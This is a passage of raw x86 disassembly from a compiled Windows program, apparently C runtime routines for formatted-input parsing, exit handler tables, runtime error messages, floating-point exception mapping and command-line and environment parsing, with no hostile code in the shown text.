  40222c:	push   DWORD PTR [ebp-0x5c]
  40222f:	call   0x403620
  402234:	mov    DWORD PTR [ebp-0x5c],eax
  402237:	mov    DWORD PTR [ebp-0x58],edx
  40223a:	jmp    0x402280
  40223c:	cmp    DWORD PTR ds:0x427278,0x1
  402243:	jle    0x402250
  402245:	push   esi
  402246:	push   ebx
  402247:	call   0x40312d
  40224c:	pop    ecx
  40224d:	pop    ecx
  40224e:	jmp    0x40225b
  402250:	mov    eax,ds:0x427270
  402255:	movzx  eax,BYTE PTR [eax+ebx*2]
  402259:	and    eax,esi
  40225b:	test   eax,eax
  40225d:	je     0x40227d
  40225f:	mov    eax,DWORD PTR [ebp-0x5c]
  402262:	mov    ecx,DWORD PTR [ebp-0x58]
  402265:	shld   ecx,eax,0x4
  402269:	shl    eax,0x4
  40226c:	mov    DWORD PTR [ebp-0x5c],eax
  40226f:	mov    DWORD PTR [ebp-0x58],ecx
  402272:	mov    eax,ebx
  402274:	call   0x40190b
  402279:	mov    ebx,eax
  40227b:	jmp    0x402280
  40227d:	inc    BYTE PTR [ebp-0x4c]
  402280:	cmp    BYTE PTR [ebp-0x4c],0x0
  402284:	jne    0x4022b3
  402286:	inc    DWORD PTR [ebp-0x40]
  402289:	lea    eax,[ebx-0x30]
  40228c:	cdq    
  40228d:	add    DWORD PTR [ebp-0x5c],eax
  402290:	adc    DWORD PTR [ebp-0x58],edx
  402293:	cmp    DWORD PTR [ebp-0x44],0x0
  402297:	je     0x4022a4
  402299:	dec    DWORD PTR [ebp-0x48]
  40229c:	jne    0x4022a4
  40229e:	mov    BYTE PTR [ebp-0x4c],0x1
  4022a2:	jmp    0x4022c6
  4022a4:	inc    DWORD PTR [ebp-0x30]
  4022a7:	mov    edx,DWORD PTR [ebp+0x8]
  4022aa:	call   0x40193d
  4022af:	mov    ebx,eax
  4022b1:	jmp    0x4022c6
  4022b3:	dec    DWORD PTR [ebp-0x30]
  4022b6:	cmp    ebx,0xffffffff
  4022b9:	je     0x4022c6
  4022bb:	push   DWORD PTR [ebp+0x8]
  4022be:	push   ebx
  4022bf:	call   0x403289
  4022c4:	pop    ecx
  4022c5:	pop    ecx
  4022c6:	cmp    BYTE PTR [ebp-0x4c],0x0
  4022ca:	je     0x4021d7
  4022d0:	mov    DWORD PTR [ebp-0x28],ebx
  4022d3:	cmp    BYTE PTR [ebp-0x4a],0x0
  4022d7:	je     0x4023e1
  4022dd:	mov    eax,DWORD PTR [ebp-0x5c]
  4022e0:	neg    eax
  4022e2:	mov    ecx,DWORD PTR [ebp-0x58]
  4022e5:	adc    ecx,0x0
  4022e8:	neg    ecx
  4022ea:	mov    DWORD PTR [ebp-0x5c],eax
  4022ed:	mov    DWORD PTR [ebp-0x58],ecx
  4022f0:	jmp    0x4023e1
  4022f5:	cmp    BYTE PTR [ebp-0x4c],0x0
  4022f9:	jne    0x4023d8
  4022ff:	mov    esi,0x80
  402304:	cmp    edi,0x78
  402307:	je     0x402350
  402309:	cmp    edi,0x70
  40230c:	je     0x402350
  40230e:	cmp    DWORD PTR ds:0x427278,0x1
  402315:	jle    0x402323
  402317:	push   0x4
  402319:	push   ebx
  40231a:	call   0x40312d
  40231f:	pop    ecx
  402320:	pop    ecx
  402321:	jmp    0x40232f
  402323:	mov    eax,ds:0x427270
  402328:	movzx  eax,BYTE PTR [eax+ebx*2]
  40232c:	and    eax,0x4
  40232f:	test   eax,eax
  402331:	je     0x402382
  402333:	cmp    edi,0x6f
  402336:	jne    0x402343
  402338:	cmp    ebx,0x38
  40233b:	jge    0x402382
  40233d:	shl    DWORD PTR [ebp-0x38],0x3
  402341:	jmp    0x402385
  402343:	mov    eax,DWORD PTR [ebp-0x38]
  402346:	lea    eax,[eax+eax*4]
  402349:	shl    eax,1
  40234b:	mov    DWORD PTR [ebp-0x38],eax
  40234e:	jmp    0x402385
  402350:	cmp    DWORD PTR ds:0x427278,0x1
  402357:	jle    0x402364
  402359:	push   esi
  40235a:	push   ebx
  40235b:	call   0x40312d
  402360:	pop    ecx
  402361:	pop    ecx
  402362:	jmp    0x40236f
  402364:	mov    eax,ds:0x427270
  402369:	movzx  eax,BYTE PTR [eax+ebx*2]
  40236d:	and    eax,esi
  40236f:	test   eax,eax
  402371:	je     0x402382
  402373:	shl    DWORD PTR [ebp-0x38],0x4
  402377:	mov    eax,ebx
  402379:	call   0x40190b
  40237e:	mov    ebx,eax
  402380:	jmp    0x402385
  402382:	inc    BYTE PTR [ebp-0x4c]
  402385:	cmp    BYTE PTR [ebp-0x4c],0x0
  402389:	jne    0x4023b8
  40238b:	inc    DWORD PTR [ebp-0x40]
  40238e:	mov    eax,DWORD PTR [ebp-0x38]
  402391:	lea    eax,[eax+ebx*1-0x30]
  402395:	mov    DWORD PTR [ebp-0x38],eax
  402398:	cmp    DWORD PTR [ebp-0x44],0x0
  40239c:	je     0x4023a9
  40239e:	dec    DWORD PTR [ebp-0x48]
  4023a1:	jne    0x4023a9
  4023a3:	mov    BYTE PTR [ebp-0x4c],0x1
  4023a7:	jmp    0x4023cb
  4023a9:	inc    DWORD PTR [ebp-0x30]
  4023ac:	mov    edx,DWORD PTR [ebp+0x8]
  4023af:	call   0x40193d
  4023b4:	mov    ebx,eax
  4023b6:	jmp    0x4023cb
  4023b8:	dec    DWORD PTR [ebp-0x30]
  4023bb:	cmp    ebx,0xffffffff
  4023be:	je     0x4023cb
  4023c0:	push   DWORD PTR [ebp+0x8]
  4023c3:	push   ebx
  4023c4:	call   0x403289
  4023c9:	pop    ecx
  4023ca:	pop    ecx
  4023cb:	cmp    BYTE PTR [ebp-0x4c],0x0
  4023cf:	je     0x402304
  4023d5:	mov    DWORD PTR [ebp-0x28],ebx
  4023d8:	cmp    BYTE PTR [ebp-0x4a],0x0
  4023dc:	je     0x4023e1
  4023de:	neg    DWORD PTR [ebp-0x38]
  4023e1:	cmp    edi,0x46
  4023e4:	jne    0x4023ea
  4023e6:	and    DWORD PTR [ebp-0x40],0x0
  4023ea:	cmp    DWORD PTR [ebp-0x40],0x0
  4023ee:	je     0x4024b2
  4023f4:	cmp    BYTE PTR [ebp-0x4b],0x0
  4023f8:	jne    0x402423
  4023fa:	inc    DWORD PTR [ebp-0x34]
  4023fd:	mov    ebx,DWORD PTR [ebp-0x64]
  402400:	mov    eax,DWORD PTR [ebp-0x38]
  402403:	cmp    DWORD PTR [ebp-0x54],0x0
  402407:	je     0x402416
  402409:	mov    eax,DWORD PTR [ebp-0x5c]
  40240c:	mov    DWORD PTR [ebx],eax
  40240e:	mov    eax,DWORD PTR [ebp-0x58]
  402411:	mov    DWORD PTR [ebx+0x4],eax
  402414:	jmp    0x402423
  402416:	cmp    BYTE PTR [ebp-0x4f],0x0
  40241a:	je     0x402420
  40241c:	mov    DWORD PTR [ebx],eax
  40241e:	jmp    0x402423
  402420:	mov    WORD PTR [ebx],ax
  402423:	inc    BYTE PTR [ebp-0x29]
  402426:	inc    DWORD PTR [ebp+0xc]
  402429:	mov    esi,DWORD PTR [ebp+0xc]
  40242c:	jmp    0x402496
  40242e:	inc    DWORD PTR [ebp-0x30]
  402431:	mov    edx,DWORD PTR [ebp+0x8]
  402434:	call   0x40193d
  402439:	mov    ebx,eax
  40243b:	mov    DWORD PTR [ebp-0x28],ebx
  40243e:	movzx  eax,BYTE PTR [esi]
  402441:	inc    esi
  402442:	mov    DWORD PTR [ebp+0xc],esi
  402445:	cmp    eax,ebx
  402447:	jne    0x40247f
  402449:	movzx  eax,bl
  40244c:	mov    ecx,DWORD PTR ds:0x427270
  402452:	test   BYTE PTR [ecx+eax*2+0x1],0x80
  402457:	je     0x402496
  402459:	inc    DWORD PTR [ebp-0x30]
  40245c:	mov    edx,DWORD PTR [ebp+0x8]
  40245f:	call   0x40193d
  402464:	movzx  ecx,BYTE PTR [esi]
  402467:	inc    esi
  402468:	mov    DWORD PTR [ebp+0xc],esi
  40246b:	cmp    ecx,eax
  40246d:	je     0x402493
  40246f:	cmp    eax,0xffffffff
  402472:	je     0x40247f
  402474:	push   DWORD PTR [ebp+0x8]
  402477:	push   eax
  402478:	call   0x403289
  40247d:	pop    ecx
  40247e:	pop    ecx
  40247f:	cmp    ebx,0xffffffff
  402482:	je     0x4024b2
  402484:	push   DWORD PTR [ebp+0x8]
  402487:	push   DWORD PTR [ebp-0x28]
  40248a:	call   0x403289
  40248f:	pop    ecx
  402490:	pop    ecx
  402491:	jmp    0x4024b2
  402493:	dec    DWORD PTR [ebp-0x30]
  402496:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  40249a:	jne    0x401984
  4024a0:	cmp    BYTE PTR [esi],0x25
  4024a3:	jne    0x4024b2
  4024a5:	mov    eax,DWORD PTR [ebp+0xc]
  4024a8:	cmp    BYTE PTR [eax+0x1],0x6e
  4024ac:	je     0x401981
  4024b2:	cmp    DWORD PTR [ebp-0x24],0x1
  4024b6:	jne    0x4024c1
  4024b8:	push   DWORD PTR [ebp-0x20]
  4024bb:	call   0x40331e
  4024c0:	pop    ecx
  4024c1:	mov    eax,DWORD PTR [ebp-0x34]
  4024c4:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  4024c8:	jne    0x4024d6
  4024ca:	test   eax,eax
  4024cc:	jne    0x4024d6
  4024ce:	cmp    BYTE PTR [ebp-0x29],al
  4024d1:	jne    0x4024d6
  4024d3:	or     eax,0xffffffff
  4024d6:	lea    esp,[ebp-0x1e4]
  4024dc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4024df:	xor    ecx,DWORD PTR [ebp+0x4]
  4024e2:	call   0x403606
  4024e7:	call   0x4030df
  4024ec:	ret    
  4024ed:	push   0x42513c
  4024f2:	call   DWORD PTR ds:0x425030
  4024f8:	test   eax,eax
  4024fa:	je     0x402512
  4024fc:	push   0x42512c
  402501:	push   eax
  402502:	call   DWORD PTR ds:0x425014
  402508:	test   eax,eax
  40250a:	je     0x402512
  40250c:	push   DWORD PTR [esp+0x4]
  402510:	call   eax
  402512:	push   DWORD PTR [esp+0x4]
  402516:	call   DWORD PTR ds:0x425048
  40251c:	int3   
  40251d:	mov    eax,ds:0x428d30
  402522:	test   eax,eax
  402524:	je     0x402528
  402526:	call   eax
  402528:	push   esi
  402529:	push   edi
  40252a:	mov    ecx,0x42700c
  40252f:	mov    edi,0x42701c
  402534:	xor    eax,eax
  402536:	cmp    ecx,edi
  402538:	mov    esi,ecx
  40253a:	jae    0x402553
  40253c:	test   eax,eax
  40253e:	jne    0x40257f
  402540:	mov    ecx,DWORD PTR [esi]
  402542:	test   ecx,ecx
  402544:	je     0x402548
  402546:	call   ecx
  402548:	add    esi,0x4
  40254b:	cmp    esi,edi
  40254d:	jb     0x40253c
  40254f:	test   eax,eax
  402551:	jne    0x40257f
  402553:	push   0x402ff4
  402558:	call   0x4036d6
  40255d:	mov    esi,0x427000
  402562:	mov    eax,esi
  402564:	mov    edi,0x427008
  402569:	cmp    eax,edi
  40256b:	pop    ecx
  40256c:	jae    0x40257d
  40256e:	mov    eax,DWORD PTR [esi]
  402570:	test   eax,eax
  402572:	je     0x402576
  402574:	call   eax
  402576:	add    esi,0x4
  402579:	cmp    esi,edi
  40257b:	jb     0x40256e
  40257d:	xor    eax,eax
  40257f:	pop    edi
  402580:	pop    esi
  402581:	ret    
  402582:	push   ebp
  402583:	mov    ebp,esp
  402585:	push   esi
  402586:	xor    esi,esi
  402588:	inc    esi
  402589:	cmp    DWORD PTR ds:0x427818,esi
  40258f:	push   edi
  402590:	jne    0x4025a2
  402592:	push   DWORD PTR [ebp+0x8]
  402595:	call   DWORD PTR ds:0x425050
  40259b:	push   eax
  40259c:	call   DWORD PTR ds:0x42504c
  4025a2:	cmp    DWORD PTR [ebp+0xc],0x0
  4025a6:	mov    al,BYTE PTR [ebp+0x10]
  4025a9:	mov    DWORD PTR ds:0x427814,esi
  4025af:	mov    ds:0x427810,al
  4025b4:	jne    0x402608
  4025b6:	mov    ecx,DWORD PTR ds:0x428d28
  4025bc:	test   ecx,ecx
  4025be:	je     0x4025e9
  4025c0:	mov    eax,ds:0x428d24
  4025c5:	sub    eax,0x4
  4025c8:	cmp    eax,ecx
  4025ca:	jmp    0x4025e2
  4025cc:	mov    eax,DWORD PTR [eax]
  4025ce:	test   eax,eax
  4025d0:	je     0x4025d4
  4025d2:	call   eax
  4025d4:	mov    eax,ds:0x428d24
  4025d9:	sub    eax,0x4
  4025dc:	cmp    eax,DWORD PTR ds:0x428d28
  4025e2:	mov    ds:0x428d24,eax
  4025e7:	jae    0x4025cc
  4025e9:	mov    eax,0x427020
  4025ee:	mov    esi,0x427028
  4025f3:	cmp    eax,esi
  4025f5:	mov    edi,eax
  4025f7:	jae    0x402608
  4025f9:	mov    eax,DWORD PTR [edi]
  4025fb:	test   eax,eax
  4025fd:	je     0x402601
  4025ff:	call   eax
  402601:	add    edi,0x4
  402604:	cmp    edi,esi
  402606:	jb     0x4025f9
  402608:	mov    eax,0x42702c
  40260d:	mov    esi,0x427030
  402612:	cmp    eax,esi
  402614:	mov    edi,eax
  402616:	jae    0x402627
  402618:	mov    eax,DWORD PTR [edi]
  40261a:	test   eax,eax
  40261c:	je     0x402620
  40261e:	call   eax
  402620:	add    edi,0x4
  402623:	cmp    edi,esi
  402625:	jb     0x402618
  402627:	cmp    DWORD PTR [ebp+0x10],0x0
  40262b:	pop    edi
  40262c:	pop    esi
  40262d:	jne    0x402642
  40262f:	push   DWORD PTR [ebp+0x8]
  402632:	mov    DWORD PTR ds:0x427818,0x1
  40263c:	call   0x4024ed
  402641:	pop    ecx
  402642:	pop    ebp
  402643:	ret    
  402644:	push   0x0
  402646:	push   0x0
  402648:	push   DWORD PTR [esp+0xc]
  40264c:	call   0x402582
  402651:	add    esp,0xc
  402654:	ret    
  402655:	push   0x0
  402657:	push   0x1
  402659:	push   DWORD PTR [esp+0xc]
  40265d:	call   0x402582
  402662:	add    esp,0xc
  402665:	ret    
  402666:	push   0x1
  402668:	push   0x0
  40266a:	push   0x0
  40266c:	call   0x402582
  402671:	add    esp,0xc
  402674:	ret    
  402675:	push   0x1
  402677:	push   0x1
  402679:	push   0x0
  40267b:	call   0x402582
  402680:	add    esp,0xc
  402683:	ret    
  402684:	push   ebp
  402685:	mov    ebp,esp
  402687:	sub    esp,0x10c
  40268d:	mov    eax,ds:0x4272a8
  402692:	xor    eax,DWORD PTR [ebp+0x4]
  402695:	mov    ecx,DWORD PTR [ebp+0x8]
  402698:	push   ebx
  402699:	push   esi
  40269a:	mov    DWORD PTR [ebp-0x4],eax
  40269d:	xor    edx,edx
  40269f:	push   edi
  4026a0:	xor    eax,eax
  4026a2:	cmp    ecx,DWORD PTR [eax*8+0x427148]
  4026a9:	je     0x4026b1
  4026ab:	inc    eax
  4026ac:	cmp    eax,0x12
  4026af:	jb     0x4026a2
  4026b1:	mov    esi,eax
  4026b3:	shl    esi,0x3
  4026b6:	cmp    ecx,DWORD PTR [esi+0x427148]
  4026bc:	jne    0x4027e5
  4026c2:	mov    eax,ds:0x4277c8
  4026c7:	cmp    eax,0x1
  4026ca:	je     0x4027c0
  4026d0:	cmp    eax,edx
  4026d2:	jne    0x4026e1
  4026d4:	cmp    DWORD PTR ds:0x427144,0x1
  4026db:	je     0x4027c0
  4026e1:	cmp    ecx,0xfc
  4026e7:	je     0x4027e5
  4026ed:	push   0x104
  4026f2:	lea    eax,[ebp-0x10c]
  4026f8:	push   eax
  4026f9:	push   edx
  4026fa:	mov    BYTE PTR [ebp-0x8],dl
  4026fd:	call   DWORD PTR ds:0x42505c
  402703:	test   eax,eax
  402705:	jne    0x40271a
  402707:	lea    eax,[ebp-0x10c]
  40270d:	push   0x425494
  402712:	push   eax
  402713:	call   0x403810
  402718:	pop    ecx
  402719:	pop    ecx
  40271a:	lea    eax,[ebp-0x10c]
  402720:	push   eax
  402721:	lea    edi,[ebp-0x10c]
  402727:	call   0x403a40
  40272c:	inc    eax
  40272d:	cmp    eax,0x3c
  402730:	pop    ecx
  402731:	jbe    0x40275c
  402733:	lea    eax,[ebp-0x10c]
  402739:	push   eax
  40273a:	call   0x403a40
  40273f:	mov    edi,eax
  402741:	lea    eax,[ebp-0x10c]
  402747:	sub    eax,0x3b
  40274a:	push   0x3
  40274c:	add    edi,eax
  40274e:	push   0x425490
  402753:	push   edi
  402754:	call   0x403910
  402759:	add    esp,0x10
  40275c:	push   edi
  40275d:	call   0x403a40
  402762:	push   DWORD PTR [esi+0x42714c]
  402768:	mov    ebx,eax
  40276a:	call   0x403a40
  40276f:	lea    eax,[ebx+eax*1+0x1c]
  402773:	pop    ecx
  402774:	add    eax,0x3
  402777:	pop    ecx
  402778:	and    eax,0xfffffffc
  40277b:	call   0x4030f0
  402780:	mov    ebx,esp
  402782:	push   0x425474
  402787:	push   ebx
  402788:	call   0x403810
  40278d:	push   edi
  40278e:	push   ebx
  40278f:	call   0x403820
  402794:	push   0x425470
  402799:	push   ebx
  40279a:	call   0x403820
  40279f:	push   DWORD PTR [esi+0x42714c]
  4027a5:	push   ebx
  4027a6:	call   0x403820
  4027ab:	push   0x12010
  4027b0:	push   0x425448
  4027b5:	push   ebx
  4027b6:	call   0x403710
  4027bb:	add    esp,0x2c
  4027be:	jmp    0x4027e5
  4027c0:	push   edx
  4027c1:	lea    eax,[ebp+0x8]
  4027c4:	push   eax
  4027c5:	lea    esi,[esi+0x42714c]
  4027cb:	push   DWORD PTR [esi]
  4027cd:	call   0x403a40
  4027d2:	pop    ecx
  4027d3:	push   eax
  4027d4:	push   DWORD PTR [esi]
  4027d6:	push   0xfffffff4
  4027d8:	call   DWORD PTR ds:0x425058
  4027de:	push   eax
  4027df:	call   DWORD PTR ds:0x425054
  4027e5:	lea    esp,[ebp-0x118]
  4027eb:	mov    ecx,DWORD PTR [ebp-0x4]
  4027ee:	xor    ecx,DWORD PTR [ebp+0x4]
  4027f1:	call   0x403606
  4027f6:	pop    edi
  4027f7:	pop    esi
  4027f8:	pop    ebx
  4027f9:	leave  
  4027fa:	ret    
  4027fb:	mov    eax,ds:0x4277c8
  402800:	cmp    eax,0x1
  402803:	je     0x402812
  402805:	test   eax,eax
  402807:	jne    0x402833
  402809:	cmp    DWORD PTR ds:0x427144,0x1
  402810:	jne    0x402833
  402812:	push   0xfc
  402817:	call   0x402684
  40281c:	mov    eax,ds:0x42781c
  402821:	test   eax,eax
  402823:	pop    ecx
  402824:	je     0x402828
  402826:	call   eax
  402828:	push   0xff
  40282d:	call   0x402684
  402832:	pop    ecx
  402833:	ret    
  402834:	push   ebp
  402835:	mov    ebp,esp
  402837:	mov    edx,DWORD PTR [ebp+0x8]
  40283a:	mov    eax,ds:0x427258
  40283f:	push   ebx
  402840:	mov    ecx,0x4271d8
  402845:	push   esi
  402846:	cmp    DWORD PTR [ecx],edx
  402848:	je     0x40285b
  40284a:	lea    esi,[eax+eax*2]
  40284d:	add    ecx,0xc
  402850:	lea    esi,[esi*4+0x4271d8]
  402857:	cmp    ecx,esi
  402859:	jb     0x402846
  40285b:	lea    eax,[eax+eax*2]
  40285e:	lea    eax,[eax*4+0x4271d8]
  402865:	cmp    ecx,eax
  402867:	jae    0x40286d
  402869:	cmp    DWORD PTR [ecx],edx
  40286b:	je     0x40286f
  40286d:	xor    ecx,ecx
  40286f:	test   ecx,ecx
  402871:	je     0x402998
  402877:	mov    ebx,DWORD PTR [ecx+0x8]
  40287a:	test   ebx,ebx
  40287c:	je     0x402998
  402882:	cmp    ebx,0x5
  402885:	jne    0x402893
  402887:	and    DWORD PTR [ecx+0x8],0x0
  40288b:	xor    eax,eax
  40288d:	inc    eax
  40288e:	jmp    0x4029a1
  402893:	cmp    ebx,0x1
  402896:	je     0x402993
  40289c:	mov    eax,ds:0x427820
  4028a1:	mov    DWORD PTR [ebp+0x8],eax
  4028a4:	mov    eax,DWORD PTR [ebp+0xc]
  4028a7:	mov    ds:0x427820,eax
  4028ac:	mov    eax,DWORD PTR [ecx+0x4]
  4028af:	cmp    eax,0x8
  4028b2:	jne    0x402983
  4028b8:	mov    eax,ds:0x427250
  4028bd:	mov    edx,DWORD PTR ds:0x427254
  4028c3:	add    edx,eax
  4028c5:	cmp    eax,edx
  4028c7:	jge    0x4028de
  4028c9:	lea    esi,[eax+eax*2]
  4028cc:	lea    esi,[esi*4+0x4271e0]
  4028d3:	sub    edx,eax
  4028d5:	and    DWORD PTR [esi],0x0
  4028d8:	add    esi,0xc
  4028db:	dec    edx
  4028dc:	jne    0x4028d5
  4028de:	mov    ecx,DWORD PTR [ecx]
  4028e0:	cmp    ecx,0xc000008e
  4028e6:	mov    esi,DWORD PTR ds:0x42725c
  4028ec:	jne    0x4028fa
  4028ee:	mov    DWORD PTR ds:0x42725c,0x83
  4028f8:	jmp    0x402970
  4028fa:	cmp    ecx,0xc0000090
  402900:	jne    0x40290e
  402902:	mov    DWORD PTR ds:0x42725c,0x81
  40290c:	jmp    0x402970
  40290e:	cmp    ecx,0xc0000091
  402914:	jne    0x402922
  402916:	mov    DWORD PTR ds:0x42725c,0x84
  402920:	jmp    0x402970
  402922:	cmp    ecx,0xc0000093
  402928:	jne    0x402936
  40292a:	mov    DWORD PTR ds:0x42725c,0x85
  402934:	jmp    0x402970
  402936:	cmp    ecx,0xc000008d
  40293c:	jne    0x40294a
  40293e:	mov    DWORD PTR ds:0x42725c,0x82
  402948:	jmp    0x402970
  40294a:	cmp    ecx,0xc000008f
  402950:	jne    0x40295e
  402952:	mov    DWORD PTR ds:0x42725c,0x86
  40295c:	jmp    0x402970
  40295e:	cmp    ecx,0xc0000092
  402964:	jne    0x402970
  402966:	mov    DWORD PTR ds:0x42725c,0x8a
  402970:	push   DWORD PTR ds:0x42725c
  402976:	push   0x8
  402978:	call   ebx
  40297a:	pop    ecx
  40297b:	mov    DWORD PTR ds:0x42725c,esi
  402981:	jmp    0x40298a
  402983:	and    DWORD PTR [ecx+0x8],0x0
  402987:	push   eax
  402988:	call   ebx
  40298a:	mov    eax,DWORD PTR [ebp+0x8]
  40298d:	pop    ecx
  40298e:	mov    ds:0x427820,eax
  402993:	or     eax,0xffffffff
  402996:	jmp    0x4029a1
  402998:	push   DWORD PTR [ebp+0xc]
  40299b:	call   DWORD PTR ds:0x425060
  4029a1:	pop    esi
  4029a2:	pop    ebx
  4029a3:	pop    ebp
  4029a4:	ret    
  4029a5:	cmp    DWORD PTR ds:0x428d2c,0x0
  4029ac:	jne    0x4029b3
  4029ae:	call   0x403ee3
  4029b3:	push   esi
  4029b4:	mov    esi,DWORD PTR ds:0x428d34
  4029ba:	test   esi,esi
  4029bc:	jne    0x4029c5
  4029be:	mov    esi,0x4254ab
  4029c3:	jmp    0x402a0a
  4029c5:	mov    al,BYTE PTR [esi]
  4029c7:	cmp    al,0x22
  4029c9:	jne    0x4029f3
  4029cb:	inc    esi
  4029cc:	mov    al,BYTE PTR [esi]
  4029ce:	cmp    al,0x22
  4029d0:	je     0x402a03
  4029d2:	test   al,al
  4029d4:	je     0x4029ec
  4029d6:	movzx  eax,al
  4029d9:	push   eax
  4029da:	call   0x403afc
  4029df:	test   eax,eax
  4029e1:	pop    ecx
  4029e2:	je     0x4029e5
  4029e4:	inc    esi
  4029e5:	inc    esi
  4029e6:	mov    al,BYTE PTR [esi]
  4029e8:	cmp    al,0x22
  4029ea:	jne    0x4029d2
  4029ec:	cmp    BYTE PTR [esi],0x22
  4029ef:	jne    0x402a04
  4029f1:	jmp    0x402a03
  4029f3:	cmp    al,0x20
  4029f5:	jbe    0x402a04
  4029f7:	inc    esi
  4029f8:	cmp    BYTE PTR [esi],0x20
  4029fb:	ja     0x4029f7
  4029fd:	jmp    0x402a04
  4029ff:	cmp    al,0x20
  402a01:	ja     0x402a0a
  402a03:	inc    esi
  402a04:	mov    al,BYTE PTR [esi]
  402a06:	test   al,al
  402a08:	jne    0x4029ff
  402a0a:	mov    eax,esi
  402a0c:	pop    esi
  402a0d:	ret    
  402a0e:	push   ebx
  402a0f:	xor    ebx,ebx
  402a11:	cmp    DWORD PTR ds:0x428d2c,ebx
  402a17:	push   esi
  402a18:	push   edi
  402a19:	jne    0x402a20
  402a1b:	call   0x403ee3
  402a20:	mov    esi,DWORD PTR ds:0x4277c0
  402a26:	xor    edi,edi
  402a28:	cmp    esi,ebx
  402a2a:	jne    0x402a3e
  402a2c:	jmp    0x402a5e
  402a2e:	cmp    al,0x3d
  402a30:	je     0x402a33
  402a32:	inc    edi
  402a33:	push   esi
  402a34:	call   0x403a40
  402a39:	pop    ecx
  402a3a:	lea    esi,[esi+eax*1+0x1]
  402a3e:	mov    al,BYTE PTR [esi]
  402a40:	cmp    al,bl
  402a42:	jne    0x402a2e
  402a44:	lea    eax,[edi*4+0x4]
  402a4b:	push   eax
  402a4c:	call   0x4034f2
  402a51:	mov    edi,eax
  402a53:	cmp    edi,ebx
  402a55:	pop    ecx
  402a56:	mov    DWORD PTR ds:0x4277f8,edi
  402a5c:	jne    0x402a63
  402a5e:	or     eax,0xffffffff
  402a61:	jmp    0x402abb
  402a63:	mov    esi,DWORD PTR ds:0x4277c0
  402a69:	push   ebp
  402a6a:	jmp    0x402a96
  402a6c:	push   esi
  402a6d:	call   0x403a40
  402a72:	mov    ebp,eax
  402a74:	inc    ebp
  402a75:	cmp    BYTE PTR [esi],0x3d
  402a78:	pop    ecx
  402a79:	je     0x402a94
  402a7b:	push   ebp
  402a7c:	call   0x4034f2
  402a81:	cmp    eax,ebx
  402a83:	pop    ecx
  402a84:	mov    DWORD PTR [edi],eax
  402a86:	je     0x402abf
  402a88:	push   esi
  402a89:	push   eax
  402a8a:	call   0x403810
  402a8f:	pop    ecx
  402a90:	pop    ecx
  402a91:	add    edi,0x4
  402a94:	add    esi,ebp
  402a96:	cmp    BYTE PTR [esi],bl
  402a98:	jne    0x402a6c
  402a9a:	push   DWORD PTR ds:0x4277c0
  402aa0:	call   0x40331e
  402aa5:	mov    DWORD PTR ds:0x4277c0,ebx
  402aab:	mov    DWORD PTR [edi],ebx
  402aad:	mov    DWORD PTR ds:0x428d20,0x1
  402ab7:	xor    eax,eax
  402ab9:	pop    ecx
  402aba:	pop    ebp
  402abb:	pop    edi
  402abc:	pop    esi
  402abd:	pop    ebx
  402abe:	ret    
  402abf:	push   DWORD PTR ds:0x4277f8
  402ac5:	call   0x40331e
  402aca:	mov    DWORD PTR ds:0x4277f8,ebx
  402ad0:	or     eax,0xffffffff
  402ad3:	jmp    0x402ab9
  402ad5:	push   ebp
  402ad6:	mov    ebp,esp
  402ad8:	push   ecx
  402ad9:	push   ebx
  402ada:	mov    ebx,DWORD PTR [ebp+0xc]
  402add:	xor    edx,edx
  402adf:	cmp    DWORD PTR [ebp+0x8],edx
  402ae2:	push   edi
  402ae3:	mov    DWORD PTR [esi],edx
  402ae5:	mov    edi,ecx
  402ae7:	mov    DWORD PTR [ebx],0x1
  402aed:	je     0x402af8
  402aef:	mov    ecx,DWORD PTR [ebp+0x8]
  402af2:	add    DWORD PTR [ebp+0x8],0x4
  402af6:	mov    DWORD PTR [ecx],edi
  402af8:	cmp    BYTE PTR [eax],0x22
  402afb:	jne    0x402b0b
  402afd:	xor    ecx,ecx
  402aff:	test   edx,edx
  402b01:	sete   cl
  402b04:	inc    eax
  402b05:	mov    edx,ecx
  402b07:	mov    cl,0x22
  402b09:	jmp    0x402b38
  402b0b:	inc    DWORD PTR [esi]
  402b0d:	test   edi,edi
  402b0f:	je     0x402b16
  402b11:	mov    cl,BYTE PTR [eax]
  402b13:	mov    BYTE PTR [edi],cl
  402b15:	inc    edi
  402b16:	mov    cl,BYTE PTR [eax]
  402b18:	movzx  ebx,cl
  402b1b:	inc    eax
  402b1c:	test   BYTE PTR [ebx+0x4289e1],0x4
  402b23:	je     0x402b31
  402b25:	inc    DWORD PTR [esi]
  402b27:	test   edi,edi
  402b29:	je     0x402b30
  402b2b:	mov    bl,BYTE PTR [eax]
  402b2d:	mov    BYTE PTR [edi],bl
  402b2f:	inc    edi
  402b30:	inc    eax
  402b31:	test   cl,cl
  402b33:	mov    ebx,DWORD PTR [ebp+0xc]
  402b36:	je     0x402b6a
  402b38:	test   edx,edx
  402b3a:	jne    0x402af8
  402b3c:	cmp    cl,0x20
  402b3f:	je     0x402b46
  402b41:	cmp    cl,0x9
  402b44:	jne    0x402af8
  402b46:	test   edi,edi
  402b48:	je     0x402b4e
  402b4a:	and    BYTE PTR [edi-0x1],0x0
  402b4e:	and    DWORD PTR [ebp-0x4],0x0
  402b52:	cmp    BYTE PTR [eax],0x0
  402b55:	je     0x402c31
  402b5b:	mov    cl,BYTE PTR [eax]
  402b5d:	cmp    cl,0x20
  402b60:	je     0x402b67
  402b62:	cmp    cl,0x9
  402b65:	jne    0x402b6d
  402b67:	inc    eax
  402b68:	jmp    0x402b5b
  402b6a:	dec    eax
  402b6b:	jmp    0x402b4e
  402b6d:	cmp    BYTE PTR [eax],0x0
  402b70:	je     0x402c31
  402b76:	cmp    DWORD PTR [ebp+0x8],0x0
  402b7a:	je     0x402b85
  402b7c:	mov    ecx,DWORD PTR [ebp+0x8]
  402b7f:	add    DWORD PTR [ebp+0x8],0x4
  402b83:	mov    DWORD PTR [ecx],edi
  402b85:	inc    DWORD PTR [ebx]
  402b87:	xor    ebx,ebx
  402b89:	inc    ebx
  402b8a:	xor    edx,edx
  402b8c:	jmp    0x402b90
  402b8e:	inc    eax
  402b8f:	inc    edx
  402b90:	cmp    BYTE PTR [eax],0x5c
  402b93:	je     0x402b8e
  402b95:	cmp    BYTE PTR [eax],0x22
  402b98:	jne    0x402bc0
  402b9a:	test   dl,0x1
  402b9d:	jne    0x402bbe
  402b9f:	cmp    DWORD PTR [ebp-0x4],0x0
  402ba3:	je     0x402bb1
  402ba5:	lea    ecx,[eax+0x1]
